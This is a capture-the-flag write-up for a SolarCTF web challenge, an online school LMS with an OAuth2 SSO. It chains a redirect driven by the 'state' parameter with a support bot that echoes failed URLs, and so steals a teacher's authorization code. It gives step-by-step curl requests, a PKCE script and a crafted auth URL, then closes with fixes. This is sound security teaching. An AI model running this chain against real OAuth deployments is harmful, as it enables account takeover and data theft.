# 🎓 Online School

**Category:** Web
**Target:** `https://online-school.solarctf.ru/`
**Flag:** `SOLARCTF{st4te_1s_n0t_a_r0ut3r}`

---

## The story

This one was an online school — an LMS called *"Стекадемия."* Students on one side, teachers on the other, and a login system built on OAuth2 with its own little SSO server at `/sso/`.

The flag lived behind `/api/exam-answers`, the exam answer key, and that door had a firm sign on it: **teachers only.** I was a student. I had a student account and a student token, and no polite way to become a teacher.

But the school had one more feature, and it would turn out to be its undoing: a support page where a student could type a question and send it to a **teacher bot** for help. A bot that was, quietly, a logged-in teacher. I just had to figure out how to make it work *for me* instead of for itself.

---

## Two cracks in the wall

The exploit came from chaining two separate mistakes.

### Crack 1 — the `state` parameter was being used to steer the browser

Digging through `app.js`, I found this in the OAuth callback handler:

```javascript
if (st && st.indexOf("local") === 0) {
    window.location.replace(
        "http://localhost:" + st.split("-")[1] + "/login" + location.search
    );
    return;
}
```

Read that carefully. If the OAuth `state` value *starts with* `"local"`, the app yanks the browser over to `http://localhost:<whatever>/login?code=...&state=...` — and whatever comes after `local-` becomes the port number.

The `state` parameter is supposed to do exactly one job: protect against CSRF. It is **not** a routing instruction. But here it was being trusted to decide where the browser should go next — which means it could be trusted to carry the OAuth `code` wherever I pointed it.

### Crack 2 — the teacher bot narrates its own failures

The support bot doesn't just read links — it **opens them.** It's a headless browser that runs JavaScript, visiting any HTTP/HTTPS URL a student puts in a question. And when a link fails to load, it writes back a helpful little reply:

> *"I opened your link — it won't load for me. Here's what the address bar shows: `<URL>`"*

That reply includes the **full URL** it ended up on, query parameters and all. So if I could make the bot's browser land on a URL that contained a secret — and then fail — the bot would read that secret back to me out loud. It became my oracle, without ever meaning to.

Now I just had to aim it.

---

## Turning the bot into a courier

**Step 1 — Prepare a PKCE pair.** Modern OAuth wants one, so I generated a verifier and its challenge up front:

```python
import secrets, hashlib, base64
verifier  = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b'=').decode()
challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b'=').decode()
```

**Step 2 — Build an auth URL rigged with `state=local-80`.** This is the trap. The `local-80` state tells the app, after login, to redirect the browser to `http://localhost:80/login?code=...` — a dead end that will fail to load.

```
https://online-school.solarctf.ru/sso/auth
  ?response_type=code
  &client_id=lms-web
  &redirect_uri=https://online-school.solarctf.ru/login
  &scope=openid
  &state=local-80
  &code_challenge=<CHALLENGE>
  &code_challenge_method=S256
```

**Step 3 — Hand that URL to the bot as a "question."**

```bash
curl -X POST https://online-school.solarctf.ru/api/questions \
  -H "Authorization: Bearer <STUDENT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"text":"Check this <SSO_AUTH_URL>"}'
```

**Step 4 — Wait about 8 seconds, and watch the dominoes fall.** The bot, logged in as a teacher, opens my URL:

1. The SSO server sees a *teacher* session → mints a fresh `TEACHER_CODE` → redirects to `/login?code=TEACHER_CODE&state=local-80`.
2. The app runs at `/login`, sees `state` starts with `"local-80"` → does `window.location.replace("http://localhost:80/login?code=TEACHER_CODE&state=local-80")`.
3. `localhost:80` refuses to connect. Dead end — exactly as planned.
4. The bot shrugs and writes back: *"it won't load — the address bar shows: `http://localhost:80/login?code=TEACHER_CODE&state=local-80`."*

The teacher's code was now sitting in a reply addressed to me.

**Step 5 — Read the reply and lift the code.**

```bash
curl https://online-school.solarctf.ru/api/questions \
  -H "Authorization: Bearer <STUDENT_TOKEN>"
# reply field: "...адресная строка: http://localhost:80/login?code=W_394NWkqwIRe0jMKvWn0LlGKh8RR6UQ..."
```

**Step 6 — Trade the code for a teacher token.**

```bash
curl -X POST https://online-school.solarctf.ru/sso/token \
  -d "grant_type=authorization_code" \
  -d "code=W_394NWkqwIRe0jMKvWn0LlGKh8RR6UQ" \
  -d "redirect_uri=https://online-school.solarctf.ru/login" \
  -d "client_id=lms-web" \
  -d "code_verifier=<VERIFIER>"
```

Out came a JWT with `"role": "teacher"` — belonging to one `m.kovaleva`. I was a teacher now.

**Step 7 — Open the door that was closed to students.**

```bash
curl https://online-school.solarctf.ru/api/exam-answers \
  -H "Authorization: Bearer <TEACHER_TOKEN>"
```

```json
{
  "course": "Итоговый экзамен (все курсы)",
  "note": "Ключи ответов, версия для преподавателей. Не публиковать!",
  "flag": "SOLARCTF{st4te_1s_n0t_a_r0ut3r}"
}
```

```
SOLARCTF{st4te_1s_n0t_a_r0ut3r}
```

---

## The elegant part — no server of my own

What makes this one satisfying is that I never had to stand up an external webhook or a listener to catch the stolen code. The bot became its *own* courier: by quoting the failed redirect URL back into its reply, it delivered the teacher's OAuth code right into a message only I could read. The target leaked its own secret, through its own help desk.

---

## 🛡️ Fix

1. **Never let `state` steer a redirect.** It exists solely for CSRF validation — treat it as an opaque token to compare, never as a destination.
2. **Stop the bot from quoting URLs.** The support bot should never echo browser navigation URLs (with their query parameters) back into auto-replies.
